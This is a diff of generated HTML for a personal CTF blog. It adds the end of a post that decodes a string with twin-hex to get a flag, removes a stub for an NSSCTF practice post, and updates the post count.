+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58s4vb6rt4pt5r32yd6ht5u656555r6796524vi69r2yd5om6w0</span><br></pre></td></tr></table></figure>
+
+<p>最后利用twin-hex解码字符串得到flag。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/22/%E3%80%90%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1582,152 +1841,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mrl64's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/" itemprop="url">NSSCTF练习1</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-04T15:23:53+08:00">
-                2022-03-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>换个平台继续刷，碰到什么做什么，然后记录一些比较有意思或者设计知识盲区的题。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1778,7 +1891,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-count">59</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
